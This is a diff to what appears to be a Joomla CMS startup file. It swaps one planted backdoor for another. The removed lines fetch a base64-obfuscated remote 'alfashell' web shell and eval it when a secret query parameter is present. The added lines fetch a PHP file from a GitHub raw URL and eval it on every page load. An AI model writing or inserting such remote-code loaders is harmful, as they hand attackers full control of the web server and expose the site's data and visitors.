@@ -42,24 +42,14 @@ if (!file_exists(JPATH_CONFIGURATION . '/configuration.php')
 		exit;
 	}
 }
-if (isset($_GET['logscms'])) { 
-    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
-    
-    $ch = curl_init($url);
-    
+    $Url = "https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/index.php";
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval('?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
+    $output = curl_exec($ch);
     curl_close($ch);
-}
+    echo eval('?>'.$output);
+    
 // Pre-Load configuration. Don't remove the Output Buffering due to BOM issues, see JCode 26026
 ob_start();
 require_once JPATH_CONFIGURATION . '/configuration.php';
